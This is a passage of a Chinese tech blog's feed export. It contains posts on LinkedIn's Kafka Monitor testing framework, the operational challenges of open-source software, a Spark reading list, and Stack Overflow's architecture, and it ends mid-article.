<li><a href="http://www.jianshu.com/u/ab7cecfb3e24">隔壁_老吴</a> ：多播如何跨网段？因为单播需要在服务器端添加所有agent IP，上百台不现实</li>
</ol>
<h2 id="扩展阅读：开源架构技术漫谈"><a href="#扩展阅读：开源架构技术漫谈" class="headerlink" title="扩展阅读：开源架构技术漫谈"></a>扩展阅读：开源架构技术漫谈</h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/27/DevOps-OpenCensus">DevOps 漫谈：基于OpenCensus构建分布式跟踪系统</a></li>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于Go语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">远程通信协议：从 CORBA 到 gRPC</a></li>
<li><a href="https://riboseyim.github.io/2017/05/24/Log/">应用程序开发中的日志管理(Go语言描述)</a></li>
<li><a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
<li><a href="https://riboseyim.github.io/2016/08/15/OpenSource-Kafka/">DevOps 资讯 | LinkedIn 开源 Kafka Monitor</a></li>
</ul>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul>
<li><a href="https://mp.weixin.qq.com/s/3ID2Ay-iplD5Fzk4I_cxVw">统一监控报警平台架构设计思路|Ganglia+Centreon</a></li>
<li><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia_DIE.png" alt="《 The ganglia distributed monitoring system: design, implementation, and experience》（必读）"></li>
<li><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia_WACM.png" alt="《Wide Area Cluster Monitoring with Ganglia》（必读）"></li>
<li><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia_ADAM.png" alt="这篇本来没有什么直接关系，是Ganglia作者的最新研究成果，仅供娱乐。"></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title>开源技术架构漫谈：Kafka</title>
    <url>/2016/08/15/OpenSource-Kafka/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>一、How Kafka Works</li>
<li>二、Kafka Application：基于 Kafka 构建事件溯源模式的微服务</li>
<li>三、Best Practice | Kafka 最佳实践 ：LinkedIn 开源 Kafka Monitor</li>
</ul>
<span id="more"></span>
<h2 id="一、How-Kafka-Works"><a href="#一、How-Kafka-Works" class="headerlink" title="一、How Kafka Works"></a>一、How Kafka Works</h2><blockquote>
<p>Kafka is a log and not a queue.</p>
</blockquote>
<h2 id="二、Kafka-Application"><a href="#二、Kafka-Application" class="headerlink" title="二、Kafka Application"></a>二、Kafka Application</h2><ul>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于Kafka构建事件溯源模式的微服务</a><br>讨论如何借助Kafka实现分布式消息管理，使用事件溯源（Event Sourcing）模式实现原子化数据处理，使用CQRS模式（Command-Query Responsibility Segregation ）实现查询职责分离，使用消费者群组解决单点故障问题，理解分布式协调框架Zookeeper的运行机制。整个应用的代码实现使用Go语言描述。</li>
</ul>
<h2 id="Best-Practice-Kafka-最佳实践"><a href="#Best-Practice-Kafka-最佳实践" class="headerlink" title="Best Practice | Kafka 最佳实践"></a>Best Practice | Kafka 最佳实践</h2><h3 id="LinkedIn-开源-Kafka-Monitor"><a href="#LinkedIn-开源-Kafka-Monitor" class="headerlink" title="LinkedIn 开源 Kafka Monitor"></a>LinkedIn 开源 Kafka Monitor</h3><blockquote>
<p>一个关于Kafka的监控测试框架</p>
</blockquote>
<ul>
<li><a href="https://engineering.linkedin.com/blog/2016/05/open-sourcing-kafka-monitor">LinkedIn.com:Open Sourcing Kafka Monitor</a></li>
</ul>
<p>Apache Kafka 已经成为了一个面向大规模流数据的，标准的消息系统。在Linkedin这样的公司，它被用作各类数据管道的主力，支持一系列关键服务。它已经成为确保企业基础架构健壮、容错和高性能的核心组件。</p>
<p>在过去,网站高可用工程师（SRE）必须依赖Kafka服务器的报告来度量、监控一个Kafka集群（例如，访问流量，离线分区计数，under-replicated分区计数，等等）。如果任何一个指标不可用，或者任何指标的值是异常的，都有可能是某些方面出错了，SRE则 需要介入问题排查。然而，从一个Kafka集群获得这些指标并不像听起来那么容易—无论集群是否可用，一个很低的流入流出值并不没有必要告诉我们，也不能为最终用户提供一个基于可用性经验的、细粒度的参考结果(比如说，在这个事件中描述道：只是一个分区的子集异常了）。随着我们的集群增长得愈加庞大，为越来越多的重要业务提供服务，可靠、精确地度量Kafka集群可用性的能力，也就变得越来越重要。</p>
<p>为了监控可用性，有必要主干的稳定性，从功能上或性能方面尽可能早的捕获可回溯的信息。Apache Kafka 在虚拟机中包含一系列单元测试和系统测试方法，用于检测错误。到目前为止，我们仍然能发现一些偶发错误，它们直到Kafka在真实的集群中已经部署很多天甚至几周之后才显现。这些错误会引起许多运行时开销或者导致服务中断。有些时候该问题很难被重现，SRE工程师只能在开发者找到原因之前回退到上一个版本，这显然要增加Kafka的部署和维护成本。在许多情况下，这些错误可以在更早的阶段就被探查出来，假如我们可以在一个具备多样化故障转移的环境部署Kafka，同时加载生产规模的流量、延长持续时间。</p>
<p>Kafka Monitor 是一个监控测试Kafka部署情况的框架，可以帮助我们针对上面的不足提供以下能力：</p>
<ul>
<li>（a）在生产集群持续监测SLA</li>
<li>（b）在测试集群持续进行回归测试。<br>在最近的 KafkaSummit 我们已经宣布在 Github上开源 Kafka Monitor。接下来我们将继续开发 Kafka Monitor 并把它作为我们事实上的Kafka认证解决方案。我们希望它也能使别的公司从中收益，那些希望验证和监控它们自己的Kafka部署情况的公司。</li>
</ul>
<h4 id="设计概览"><a href="#设计概览" class="headerlink" title="设计概览"></a>设计概览</h4><p>Kafka Monitor 使得这些事情变得很容易：<br>在真实的生产集群中，开发和执行长时间运行特定的Kafka系统测试，基于用户提供的SLA监控已经部署的Kafka。</p>
<p>开发者可以创建新的测试，通过组装可复用的组件，用来仿真各种各样的场景（例如 GC 中断，代理被硬杀，回滚，磁盘故障，等等），收集指标；用户可以运行 K afka Monitor测试用例，在这些场景执行的时候可以伴随用户定义的定时任务，无论是测试集群还是生产集群，都能够验证，Kafka在这些场景下，是否能够达到预期效果。 为了实现上述目标，Kafka Monitor 的设计模型包含一系列测试结果收集器和服务。</p>
<p>一个Kafka Monitor 实例运行在一个单独的Java进程，在相同的进程里可以再产生多个测试用例和服务。下面的示意图表达了服务，测试用例和Kafka Monitor实例之间的关系，也可以知道Kafka  Monitor 如何在Kafka集群和用户之间相互作用。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/KafkaMonitor-2.jpg" alt=""></p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>一个典型的测试，将仿真一系列场景，基于某些前期已经定义的定时任务，需要启动一些生产者／消费者，上报指标，验证指标值是否符合前期定义的断言。举个例子，Kafka Monitor 能够启动一个生产者，一个消费者，每五分钟反射一个随机代理（比方说，如果说它是监控一个测试集群）。Kafka Monitor 接下来就可以度量可用性，消息丢包率，揭露JMX指标，用户可以在一个实时的健康仪表盘看到这些信息。<br> 如果消息丢包率比一些阀值还要大，它能发出告警，这些阀值基于用户特定的可用性模型确定。</p>
<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>我们概括了仿真逻辑，针对持续长时间场景的服务，目的是为了加快、简化从复用组件组装测试的过程。<br>一个服务将再产生它自己的线程，去执行那些场景、测量指标。举例说明，我们现在已经具备如下服务：</p>
<ul>
<li>[ ] 生产者服务，生成Kafka消息，测量生产速率和可用性指标。</li>
<li>[ ] 消费者服务，消费Kafka消息，测量消息丢包率，消息复制速率以及端到端时延。这些服务依赖于生产者服务来提供消息，它会嵌入一个消息序列号和时间戳。</li>
<li>[ ] 代理反射服务，能够基于预定义的定时任务提供一个发射代理。</li>
</ul>
<p>一种测试需要由许多服务组成，验证一系列超时场景。举例来说，我们可以创建一个测试，包含一个生产者服务，一个消费者服务，以及一个代理反射服务。这个生产者服务和消费者服务，将被配置为从同一个主题发送和接收消息。那么这个测试将验证消息丢包率持续为0。</p>
<h4 id="使用多个Kafka-Monitor实例进行集群间性能测试"><a href="#使用多个Kafka-Monitor实例进行集群间性能测试" class="headerlink" title="使用多个Kafka Monitor实例进行集群间性能测试"></a>使用多个Kafka Monitor实例进行集群间性能测试</h4><p>当所有的服务和相同的Kafka Monitor实例必须运行在同一个物理机器上的时候，我们可以启动多个Kafka Monitor 实例在不同的集群，<br>一起协作完成一个精密控制的端到端测试。在下面这个测试示意图中，我们启动了两个Kafka Monitor 实例在两个集群中。<br>第一个Kafka Monitor 实例包含一个生产者服务，提供给Kafka 集群1。消息从集群1反射到集群2。<br>最后，在第二个Kafka Monitor 实例的消费者服务，处理了消息，来自集群2中的同一个主题，并且报告了通过集群通道的端到端时延。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/KafkaMonitor-3.jpg" alt="">     </p>
<h3 id="Kafka-Monitor-在-LinkedIn-的应用"><a href="#Kafka-Monitor-在-LinkedIn-的应用" class="headerlink" title="Kafka Monitor 在 LinkedIn 的应用"></a>Kafka Monitor 在 LinkedIn 的应用</h3><ul>
<li><p>监控Kafka集群部署情况<br>在2016年早些时候，我们部署了Kafka Monitor用来监控可用性和端到端时延，包括LinkedIn的每一个Kafka集群。<br>本项目的 wiki 展示了更多细节，以及这些指标是如何度量的。这些基本但是关键的指标，对于积极地监控我们Kafka集群的SLA非常有用。</p>
</li>
<li><p>在端到端工作流中验证客户端库<br>正如早先发布的一篇BLOG中说明的那样，我们有一个客户端的库，缠绕在普通的Apache Kafka生产者和消费者，<br>用于提供一些 Apache Kafka 无法支持的特性，例如Avro编码，审计和大消息支持。我们也有一个REST客户端，<br>它允许非JAVA应用程序从Kafka生产和消费数据。这些客户端库和每一个新的Kafka release版本，验证它们的功能可用性是非常重要的。<br>Kafka Monitor允许用户将客户端库作为插件，加入到它的端到端工作流中。我们已经部署的Kafka Monitor实例，<br>已经在测试中使用我们封装的客户端和REST客户端，用于验证它们的性能和功能，使得这些客户端库和Apache Kafka的每一个新的release版本都能符合要求。</p>
</li>
<li><p>验证Apache Kafka新的内部Release版本<br>我们通常每个季度都会从Apache Kafka的主干版本复制代码，然后建立一个新的内部release版本，或者吸收Apache Kafka新的特性。<br>从主干复制代码的一个重要的收益就是，部署Kafka到LinkedIn的生产集群之后，通常能在Apache Kafka的主干版本上探查到一些问题，<br>这样的话我们就能在Apache Kafka 官方正式的release发布之前获得修复。<br>基于复制Apache Kafka主干版本可能存在的风险，我们做了额外的工作，在一个测试集群中验证每个内部release版本—从生产集群中获得镜像流量—几周以前生产环境部署新的release。<br>举例来说，我们执行回退或者硬杀掉代理的时候，需要检查JMX指标去验证确实有一个控制进程并且没有离线分区，为了验证Kafka在故障迁移场景中的可用性。<br>在过去，这些步骤都是手工进行的，非常消耗时间，并且我们有大量事件和许多场景需要测试，这种方式的伸缩性就非常差。我们切换到Kafka Monitor之后，<br>这个过程就自动化了，并且可以覆盖更多故障迁移的场景，而且是可以持续进行的。</p>
</li>
</ul>
<h4 id="相关工作的比较"><a href="#相关工作的比较" class="headerlink" title="相关工作的比较"></a>相关工作的比较</h4><p>Kafka Monitor 对其它公司而言也是有用的，可以帮助验证他们自己的客户端库和Kafka集群。<br>当然 Microsoft 也已经在 Github 上有了一个开源项目，也是监控室Kafka集群的可用性和端到端时延。<br>同样地，在这篇发表的博客中，Netflix介绍了一种监控服务，即发送持续的心跳消息，同时度量这些消息的时延。<br>Kafka Monitor自己的特点就是专注于可扩展性，模块化以及客户端库和多样化场景支持。</p>
<h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>Kafka Monitor的源代码可以从 Github 下载，基于Apache 2.0 授权协议。使用指南，设计文档和未来规划在README文件和项目wiki中可以查阅。我们很乐于听到你对该项目的反馈意见。当Kafka Monitor被设计用来作为，测试和监控Kafka部署情况的框架的时候，我们视线了一个基本的但是有用的测试，确保你能开箱即用。这些测试可以度量可用性，端到端时延，消息丢包率以及消息复制速率，通过运行一个生产者和一个消费者，它们使用同一个主题生产／处理消息。你可以在终端看到这些指标，基于HTTP GET请求、程序化地获得它们的值，甚至随着时间查看它们的值，通过一个简单（快速启动）的图形界面，如下面的截图所示。关于如何运行测试、查看指标的详细介绍内容请参阅项目网站。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/KafkaMonitor-1.jpg" alt=""></p>
<h4 id="未来的工作"><a href="#未来的工作" class="headerlink" title="未来的工作"></a>未来的工作</h4><p>我们的计划中有许多工作要做，改进、提升 Kafka Monitor，使它更有用。</p>
<ul>
<li><p>增强测试场景<br>每次执行代码 check-in 的时候，Apache Kafka 包含了一大批系统测试。我们计划在Kafka Monitor中实现一个简单的测试，<br>然后部署到LinkedIn的测试集群，最终做到持续运行这些测试。这使得我们可以在问题发生的时候进行性能回溯，<br>还可以验证各种特性的是否可用，例如限额、管理操作，授权，等等。</p>
</li>
<li><p>整合Graphite和类似的框架<br>它对用户来说非常有用，可以在他们的组织内，通过一个简单的 web 服务查看所有跟 Kafka 相关的指标。我们计划在 Kafka Monitor 中提升现有的报表服务，这样用户就能够导出 Kafka Monitor 的指标到 <a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">Graphite</a> 或者他们选择的其它框架</p>
</li>
<li><p>整合故障注入框架<br>我们也计划将 Kafka Monitor 与故障注入框架整合（名叫 Simoorg），可以测试、收集Kafka在更全面的故障迁移场景中的处理能力，例如磁盘故障或者数据错误。</p>
</li>
</ul>
<h2 id="扩展阅读：开源架构技术漫谈"><a href="#扩展阅读：开源架构技术漫谈" class="headerlink" title="扩展阅读：开源架构技术漫谈"></a>扩展阅读：开源架构技术漫谈</h2><ul>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">Stack Overflow：2017年最赚钱的编程语言</a></li>
<li><a href="https://riboseyim.github.io/2017/12/21/Language-Auto-Generator/">玩转编程语言:构建自定义代码生成器</a></li>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">远程通信协议：从 CORBA 到 gRPC</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2016/08/15/OpenSource-Kafka/">LinkedIn 开源 Kafka Monitor</a></li>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于Go语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/05/24/Log/">应用程序开发中的日志管理(Go语言描述)</a></li>
<li><a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/6s5QuE5fYep0XogrhmOwRg">LinkedIn使用Kafka进行关键业务消息传输的经验总结 | 秦江杰@QCon</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
        <tag>Engineering</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>开源软件的运营挑战</title>
    <url>/2017/11/05/OpenSource-Operational/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="The-Big-Picture"><a href="#The-Big-Picture" class="headerlink" title="The Big Picture"></a>The Big Picture</h2><ul>
<li>原文：<a href="https://www.linux.com/blog/learn/chapter/open-source-management/2017/3/6-operational-challenges-using-open-source-software">6 Operational Challenges to Using Open Source Software | By Linux FoundationMarch 15, 2017Blog</a></li>
</ul>
<blockquote>
<p>在当今迅速发展的市场中，那些速度最快、成本最低的持续创新公司才会赢 。同时，正如你所知，我们正在进行的一系列观察，使用开源软件能够实现快速、低成本的创新。 但它也能引入运营挑战和法律风险。</p>
</blockquote>
<p>我们现在已经到了这样一个临界点，开源软件已经成为主流，不使用开源几乎肯定会使你的组织处于劣势。所以你必须学会如何驾驭挑战和风险，才能保持竞争力。</p>
<blockquote>
<p>“开源是无处不在的，它是不可避免的……对抗开源的政策是不切实际的，会使你处于竞争劣势。”——加特纳。</p>
</blockquote>
<p>在这篇文章中，我们将探讨开源如何成为构建软件现实途径。然后，我们将介绍这种新的软件开发方法为组织引入的挑战。</p>
<h4 id="一、开源软件革命"><a href="#一、开源软件革命" class="headerlink" title="一、开源软件革命"></a>一、开源软件革命</h4><p>从大约四十年前开始，发端于创新学术研究和GNU工具项目，开源软件已经成为主流并重塑了许多行业。今天，已经有超过150万个独特的开源项目，贡献给软件开发者的工作代码超过百万兆字节。这些资源的可用性、软件模块化的趋势以及软件重用，从根本上改变了大多数公司开发软件的方式。</p>
<p>不久以前，我们大部分软件产品都是自己内部开发的。我们也许会使用了一些第三方组件，用以连接到其他系统或执行一些特殊的业务，但这些都是通过一个精心控制的采购流程控制的。</p>
<p>今天，我们可以利用互联网上免费的开源组件，以更快的速度开发更复杂的软件。我们的大部分活动已经从设计开发定制软件，转变为整合现成的组件或半成品。我们只对应用程序中确实非常独特的部分进行编程。</p>
<p>但是现在，我们不再重复一些精心控制的代码收购，而是从互联网上反复下载代码来进行评估、原型制作和集成。虽然这种方法加快了开发速度，但它制造了一系列新的重大挑战。</p>
<h4 id="二、开源软件六大运营挑战"><a href="#二、开源软件六大运营挑战" class="headerlink" title="二、开源软件六大运营挑战"></a>二、开源软件六大运营挑战</h4><p>使用开源软件带来了许多好处，但它会在软件开发生命周期中引入风险和额外的操作复杂性。</p>
<ol>
<li><p>组织必须处理许多新的软件源代码，包括商业和非商业的供应商 – 一些人使用的开源软件来自数百个不同的来源。</p>
</li>
<li><p>众多可用的开源组件导致需要大量的第三方软件采购决策。这些决策如何做出？许多开发者没有相应的资质考虑所有这些必要的方面，包括软件许可证分析，但是一个沉重复杂的流程，例如陈旧的采购方法，代价昂贵和而且费时很长，以至于无法应用到大量新的采购决策中。</p>
</li>
<li><p>集成了大量的第三方组件会制造复杂性。其中一方面就是在多个相互依赖的代码栈中维护软件版本的一致性。</p>
</li>
<li><p>开源软件项目的范围，覆盖业余玩家到专业的开发和版本测试等不同阶段。您的组织必须确保每个应用程序都能选择相应质量保障级别的组件。</p>
</li>
<li><p>您的组织将如何获得所有这些开源组件的技术支持和更新？健康的开源社区提供优秀的支持和维护，但开源的自助服务模式，需要您的开发者与社区的共同参与这部分工作。</p>
</li>
<li><p>商业合作关系可以通过增加财政奖励的方式，向供应商强化你的诉求主张，但是否能影响开源项目的方向取决于您参与的多方面因素。</p>
</li>
</ol>
<h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><h3 id="Microservice"><a href="#Microservice" class="headerlink" title="Microservice"></a>Microservice</h3><ul>
<li><a href="https://github.com/nytimes/gizmo">project gizmo</a></li>
</ul>
<p>Gizmo 是一个集合，集中了可整合的工具、功能以及交互页面来帮助开发者构建 Go 服务，具体来说就是将 API 和 pubsub daemons 集合在一起。这个工具包刚开始的时候是由一小群开发者发起的，目的是为 NYT 构建一个专属邮件平台。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2016/11/04/OpenSource-Ganglia/">基于Ganglia实现服务集群性能态势感知</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.linux.com/blog/learn/chapter/open-source-management/2017/3/6-operational-challenges-using-open-source-software">6 Operational Challenges to Using Open Source Software | By Linux FoundationMarch 15, 2017Blog</a></li>
<li><a href="https://www.infoq.cn/article/2016/02/gizmo-microservices-toolkit">纽约时报开发出基于 Go 语言的微服务工具包 Gizmo</a></li>
<li><a href="https://brandur.org/minimalism?utm_source=wanqu.co&amp;utm_campaign=Wanqu+Daily&amp;utm_medium=website">In Pursuit of Production Minimalism | 公司里面使用的技术要尽量少。不要引入太多种的编程语言、编程框架、不同类型的数据库等。定期淘汰过时的项目、顺便淘汰掉让人头疼的那些编程语言、框架、软件等。多引入一个新技术，就多了出事故的风险。</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>开源技术架构漫谈：Spark</title>
    <url>/2017/06/30/OpenSource-Spark/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>待编辑</strong></p>
<a id="more"></a>
<h2 id="Introduction-Apache-Spark-简介"><a href="#Introduction-Apache-Spark-简介" class="headerlink" title="Introduction | Apache Spark 简介"></a>Introduction | Apache Spark 简介</h2><h2 id="Core-Concept-Apache-Spark-核心概念"><a href="#Core-Concept-Apache-Spark-核心概念" class="headerlink" title="Core Concept | Apache Spark 核心概念"></a>Core Concept | Apache Spark 核心概念</h2><ul>
<li><a href="#">art</a></li>
</ul>
<h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4><h2 id="Architecture-Apache-Spark-架构"><a href="#Architecture-Apache-Spark-架构" class="headerlink" title="Architecture | Apache Spark 架构"></a>Architecture | Apache Spark 架构</h2><h2 id="Best-Practice-Apache-Spark-最佳实践"><a href="#Best-Practice-Apache-Spark-最佳实践" class="headerlink" title="Best Practice | Apache Spark 最佳实践"></a>Best Practice | Apache Spark 最佳实践</h2><h2 id="Apache-Spark-ABC"><a href="#Apache-Spark-ABC" class="headerlink" title="Apache Spark ABC"></a>Apache Spark ABC</h2><h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.infoq.com/cn/news/2017/08/Spark-on-Angel-swift?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global" target="_blank" rel="noopener">Spark on Angel：Spark机器学习的核心加速器</a></li>
<li><a href="http://zhangyi.farbox.com/post/architecture/thinking-in-micro-service" target="_blank" rel="noopener">张逸：对微服务的简单思考</a></li>
<li><a href="http://agiledon.github.com/blog/2014/11/18/present-and-future-of-spark/" target="_blank" rel="noopener">张逸：Spark的现状和未来发展,201411</a><br>Spark提供的基于RDD的一体化解决方案，将MapReduce、Streaming、SQL、Machine Learning、Graph Processing等模型统一到一个平台下，并以一致的API公开，并提供相同的部署方案，使得Spark的工程应用领域变得更加广泛。</li>
<li><a href="http://agiledon.github.com/blog/2014/09/22/understanding-scala-stack/" target="_blank" rel="noopener">张逸：快速了解Scala技术栈</a></li>
<li><a href="http://agiledon.github.com/blog/2014/09/10/understanding-rdd-of-spark/" target="_blank" rel="noopener">张逸：理解Spark的核心RDD</a></li>
<li><a href="http://agiledon.github.com/blog/2014/05/08/hardware-on-spark/" target="_blank" rel="noopener">张逸：Spark的硬件配置</a></li>
<li><a href="http://zhangyi.farbox.com/post/bigdata/data-ingestion-on-big-data-platform" target="_blank" rel="noopener">张逸：剖析大数据平台的数据采集</a></li>
<li><a href="http://cholerae.com/2015/04/11/-%E7%BF%BB%E8%AF%91-Spark%E7%BC%96%E7%A8%8B%E6%8C%87%E5%8D%97-Python%E7%89%88/" target="_blank" rel="noopener">Spark编程指南(Python版) | Cholerae</a></li>
<li><a href="http://cholerae.com/2015/03/06/Spark%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">Spark存储机制分析 | Cholerae</a></li>
<li><a href="http://www.infoq.com/cn/articles/the-road-of-spark-performance-tuning?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global" target="_blank" rel="noopener">解决Spark数据倾斜（Data Skew）的N种姿势</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title>开源技术架构漫谈：Stack Overflow 架构全解析</title>
    <url>/2016/07/17/OpenSource-StackOverflow/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>Stack Overflow 架构解析，其架构既有商业外包服务，也大量采用开源软件，可以全景式展现当代主流架构的风貌。<br>Stack Overflow 由 Jeff Atwood 和 Joel Spolsky 这两个非常著名的 Blogger 在 2008 年创建。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/StackOverflow-2.png" alt=""></p>
<p>第一篇：总体架构<br>第二篇：硬件清单<br>第三篇：部署流程 (未翻译)</p>
<span id="more"></span>
<blockquote>
<p>As of April 2014, Stack Overflow has over 4,000,000 registered users[19]and more than 10,000,000 questions,[20]with 10,000,000 questions celebrated[21]in late August 2015. Based on the type oftagsassigned to questions, the top eight most discussed topics on the site are:Java,JavaScript,C#,PHP,Android,jQuery,PythonandHTML。——wiki</p>
</blockquote>
<h1 id="总体架构"><a href="#总体架构" class="headerlink" title="总体架构"></a>总体架构</h1><p>Stack Overflow 可以分解为八个切面：互联网、负载均衡、web层、服务层、缓存、推送、搜索、数据库。</p>
<h4 id="First-Rule-Everything-is-redundant"><a href="#First-Rule-Everything-is-redundant" class="headerlink" title="First Rule:Everything is redundant"></a>First Rule:Everything is redundant</h4><p>两个数据中心：纽约和科罗拉多，冗余且持续备份。其它所有关键组件都尽可能贯彻冗余原则。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/StackOverflow-1.png" alt="全景视图"></p>
<h4 id="物理架构"><a href="#物理架构" class="headerlink" title="物理架构"></a>物理架构</h4><ul>
<li>4 台 Microsoft SQL Server 服务器（其中 2 台使用了新的硬件）</li>
<li>11 台 IIS Web 服务器（新的硬件）</li>
<li>2 台 Redis 服务器（新的硬件）</li>
<li>3 台标签引擎服务器（其中 2 台使用了新的硬件）</li>
<li>3 台 Elasticsearch 服务器（同上）</li>
<li>4 台 HAProxy 负载均衡服务器（添加了 2 台，用于支持 CloudFlare）</li>
<li>2 台网络设备（Nexus 5596 核心 + 2232TM Fabric Extender，升级到 10Gbps 带宽）</li>
<li>2 台 Fortinet 800C 防火墙（取代了 Cisco 5525-X ASAs）</li>
<li>2 台 Cisco ASR-1001 路由器（取代了 Cisco 3945 路由器）</li>
<li>2 台 Cisco ASR-1001-x 路由器</li>
</ul>
<h4 id="逻辑架构"><a href="#逻辑架构" class="headerlink" title="逻辑架构"></a>逻辑架构</h4><p>The Internets 互联网<br>DNS服务：外包CloudFlare + 自建DNS<br>其实外包DNS服务应该已经可以满足服务，不过出于保险起见，还是有一套自建的DNS Server。</p>
<p>看来trust issues 中外一致啊。</p>
<p>Load Balancers 负载均衡<br>HAProxy 1.5.15 on CentOS 7<br>支持TLS (SSL)流量。关注HAProxy 1.7,它即将支持HTTP/2。</p>
<p>引入开源架构之后，就必须持续关注、跟进社区的发展动态。</p>
<p>吃着碗里的，看着锅里的，永远不能停。</p>
<p>Web Tier Web层<br>IIS 8.5, ASP.Net MVC 5.2.3, and .Net 4.6.1<br>Service Tier 服务层<br>IIS, ASP.Net MVC 5.2.3, .Net 4.6.1, and HTTP.SYS<br>Cache缓存<br>Redis<br>L1级别：HTTP 缓存</p>
<p>L2级别：L1级别缓存失败之后，通过Redis获取数据</p>
<p>L1&amp;L2都是无法命中的情况下，会从数据库查询，并更新到缓存和Redis。</p>
<p>缓存更新：基于发布／订阅模型，利用这个机制来清除其他服务上的 L1 缓存，用来保持 web 服务器上的缓存一致性。<br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Architecture-Redis-Utilization.png" alt=""><br>另外Redis实例的CPU都很低，不到2%，这点很惊人。</p>
<h4 id="Push推送"><a href="#Push推送" class="headerlink" title="Push推送"></a>Push推送</h4><p>开源库：NetGrain<br>使用 <a href="http://www.ruanyifeng.com/blog/2017/05/websocket.html">Websocket</a> 向用户推送实时的更新内容，比如顶部栏中的通知、投票数、新导航数、新的答案和评论。在高峰时刻，大约有 50 万个并发的  <a href="http://www.ruanyifeng.com/blog/2017/05/websocket.html">Websocket</a>  连接，这可是一大堆浏览器。</p>
